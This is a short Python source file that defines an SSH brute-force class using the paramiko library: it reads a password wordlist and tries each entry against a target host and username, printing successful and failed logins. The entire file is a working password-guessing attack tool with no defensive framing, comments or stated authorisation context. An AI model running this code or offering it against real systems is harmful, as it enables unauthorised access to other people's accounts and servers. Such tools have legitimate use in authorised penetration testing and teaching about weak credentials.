import paramiko


class SSHBruteForcer:
    def __init__(self, host, username, password_list):
        self.host = host
        self.username = username
        self.password_list = password_list

    def run(self):
        with open(self.password_list, 'r') as file:
            for password in file:
                password = password.strip()
                if self.attempt_login(password):
                    print(f"[+] Successful login: {self.username}:{password}")
                    return
                else:
                    print(f"[-] Failed: {password}")

    def attempt_login(self, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.host, username=self.username, password=password, timeout=3)
            client.close()
            return True
        except:
            return False
